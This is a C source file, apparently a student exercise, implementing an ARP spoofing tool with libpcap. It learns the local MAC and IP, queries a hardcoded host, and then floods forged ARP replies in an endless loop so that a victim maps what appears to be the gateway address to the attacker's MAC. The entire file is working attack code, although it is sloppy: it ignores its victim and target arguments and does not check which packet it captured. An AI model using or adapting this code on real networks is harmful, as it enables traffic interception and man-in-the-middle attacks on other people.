#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>

void usage() {
    printf("syntax: sende_arp <interface> <victim_ip> <target_ip>\n");
    printf("sample: sende_arp wlan0 192.168.10.2 192.168.10.1\n");
}
typedef struct ETH{
    uint8_t D_Mac[6];
    uint8_t S_Mac[6];
    uint16_t Type;
}ETH;


int main(int argc, char* argv[]) {
    printf("%d\n",argc);
    /*if (argc != 2) {
        usage();
        return -1;
    }*/
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr* header;
    const u_char* packet;
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    int sock = socket(PF_INET, SOCK_DGRAM, 0);
    struct ifreq req;
    int j = 0;
// My Mac //
    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&req, 0, sizeof(req));
    strncpy(req.ifr_name, dev, IF_NAMESIZE - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &req) < 0) {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }

    uint8_t my_mac[6];
    for(j=0;j<=5;j++) {
        my_mac[j]=(unsigned char) req.ifr_hwaddr.sa_data[j];
    }
    // My Mac End //
    pcap_if_t *alldevs;
    pcap_if_t *d;
    struct pcap_addr *a;
    int i = 0;
    int no;
    char *myip;

    if (pcap_findalldevs(&alldevs, errbuf) < 0) {
        printf("pcap_findalldevs error\n");
        return 1;
    }
    for(pcap_if_t *d=alldevs; d!=NULL; d=d->next) {
        if(!strcmp(dev,d->name))
        {
            for(pcap_addr_t *a=d->addresses; a!=NULL; a=a->next) {
                if(a->addr->sa_family == AF_INET)
                    myip=inet_ntoa(((struct sockaddr_in*)a->addr)->sin_addr);

            }
        }

    }
    pcap_freealldevs(alldevs);

    // My IP to int //
    char *sitemp;
    char *si[4];
    int si_int[4];
    int k=1;

    sitemp = strtok(myip, ".");
    si[0]=sitemp;
    while (sitemp != NULL) {
        sitemp = strtok(NULL, ".");
        si[k]=sitemp;
        k++;

    }

    for (int i=0; i<=3; i++){
        si_int[i]=atoi(si[i]);
    }
    //My ip End//
    //my_mac
    //si_int
    u_int8_t re[42];
    re[0] = 0xff;
    re[1] = 0xff;
    re[2] = 0xff;
    re[3] = 0xff;
    re[4] = 0xff;
    re[5] = 0xff;

    //00 0c 29 6f 91 7f
//    re[6] = 0x00;
//    re[7] = 0x0c;
//    re[8] = 0x29;
//    re[9] = 0x6f;
//    re[10] = 0x91;
//    re[11] = 0x7f;

    re[12] = 0x08;
    re[13] = 0x06;

    re[14] = 0x00;
    re[15] = 0x01;

    re[16] = 0x08;
    re[17] = 0x00;

    re[18] = 0x06;
    re[19] = 0x04;

    re[20] = 0x00;
    re[21] = 0x01;

//    re[22] = 0x00;
//    re[23] = 0x0c;
//    re[24] = 0x29;
//    re[25] = 0x6f;
//    re[26] = 0x91;
//    re[27] = 0x7f;

//    re[28] = 0xac;
//    re[29] = 0x14;
//    re[30] = 0x0a;
//    re[31] = 0x06;

//    re[32] = 0x00;
//    re[33] = 0x00;
//    re[34] = 0x00;
//    re[35] = 0x00;
//    re[36] = 0x00;
//    re[37] = 0x00;

    re[38] = 0x0a;
    re[39] = 0x01;
    re[40] = 0x01;
    re[41] = 0x01;
//    scanf("%02x%02x%02x%02x",re[38],re[39],re[40],re[41]);
    for(int i = 0;i<6; i++){
        re[i+6] = my_mac[i];//s_mac
        re[i+22] = my_mac[i];//sender_mac
    }
    for(int i = 0;i<4;i++){
        re[i+28] = (uint8_t)si_int[i];//sender_ip
    }

    for(int i = 0;i<6;i++){
        printf("%02x ",re[i+6]);
    }
    pcap_sendpacket(handle,re,42);

    putchar('\n');
    int res = pcap_next_ex(handle, &header, &packet);
    ETH *ether_h;
    ether_h = (ETH*)packet;
    if(ntohs(ether_h->Type)==0x0806){
        printf("%02x\n",ntohs(ether_h->Type));
    }
    for(int i = 0;i<6; i++){
        re[i] = ether_h->S_Mac[i];
        re[i+32] = ether_h->S_Mac[i];
    }
    for(int i = 0;i<6;i++){
        re[i+22] = my_mac[i];
    }
    for(int i = 0;i<4;i++){
        re[i+28] = (uint8_t)si_int[i];//sender_ip
    }
    re[21] = 0x02;
    re[31] = 0x01;



    while(1){
        pcap_sendpacket(handle,re,42);
    }


    return 0;
}
